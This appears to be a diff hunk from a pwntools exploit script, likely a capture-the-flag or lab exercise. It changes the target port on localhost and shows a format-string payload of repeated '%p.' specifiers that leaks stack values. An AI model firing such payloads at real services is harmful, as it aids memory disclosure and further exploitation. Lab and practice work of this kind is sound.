@@ -2,7 +2,7 @@ from pwn import *
 import math
 
 ip = "localhost"
-port = 9696
+port = 10420
 
 payload = b"%p."*(50//3)
 
